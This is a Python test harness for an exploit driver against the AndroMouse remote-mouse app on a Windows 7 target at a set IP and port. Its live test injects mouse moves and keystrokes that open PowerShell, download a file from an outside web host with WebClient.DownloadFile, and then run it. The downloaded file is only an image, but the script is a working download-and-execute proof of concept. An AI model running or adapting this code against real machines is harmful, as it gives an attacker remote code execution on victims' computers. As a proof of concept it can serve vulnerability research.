import sys
from andromouse_driver import AndroMouseDriver as driver
from time import sleep

IP = "172.16.78.131"
PORT = 8888

"""
Tests the AndroMouse exploit driver by:
    - opening the Windows start menu
    - opening Yahoo in the primary web browser

The tests are meant to be run on Windows 7.

When running the test, you can specify the IP address of the system to be
exploited as the first command-line parameter.
"""

def main():
    if len(sys.argv) >= 2:
        ip = sys.argv[1]
    else:
        ip = IP

    r = driver(ip, PORT)

    tests = [test_open_url,
             test_powershell]

    for run in tests:
        clean_environment(r)
        run(r)
        sleep(3)

def clean_environment(r):
    r.move_mouse(-2000,-2000)

"""
Demonstrates that we can both open an arbitrary page in the default browser and
use the browser itself by navigating to another page. F4 shortcut is IE-specific.
"""
def test_open_url(r):
    # r.open_url("http://www.yahoo.com/")
    # sleep(1)
    # r.press_action_key("TAB", shift=True)
    # sleep(4)
    # r.press_action_key("F4")
    # sleep(0.2)
    # r.type("www.google.com\n")
    pass

"""
Demonstrates that we can download an arbitrary file from the Internet and
execute it.
"""
def test_powershell(r):
    r.move_mouse(-2000,2000).left_click()
    sleep(0.5)
    r.type('powershell\n')
    sleep(4)
    r.type('$c = new-object System.Net.WebClient\n') \
     .type('$c.DownloadFile("http://mit.edu/img/BackImage.jpg","Desktop\\BackImage.jpg")\n') \
     .type('.\\Desktop\\BackImage.jpg\n')

if __name__ == "__main__":
    main()
